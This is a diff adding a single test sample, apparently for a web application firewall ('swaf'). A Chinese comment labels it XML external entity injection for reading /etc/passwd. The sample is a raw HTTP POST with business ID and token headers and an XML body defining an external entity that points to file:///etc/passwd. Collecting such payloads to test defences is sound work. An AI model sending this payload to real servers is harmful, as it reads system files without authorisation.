@@ -1,0 +1,15 @@
+# XML外部实体注入_文件读取_/etc/passwd
+# 攻击者通过构造此语句利用file协议可以读取linux系统上配置文件passwd
+POST /?bid=hd_tag_m8mv24mu HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24mu
+RM-PRO-Token: 64007de9e8d08d292872120491d7c0bd
+RM-PRO-Time: 1742808393152
+User-Agent: curl/7.83.1
+Content-Type: application/xml
+
+<?xml version = "1.0"?>
+<!DOCTYPE ANY [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<x>&xxe;</x>
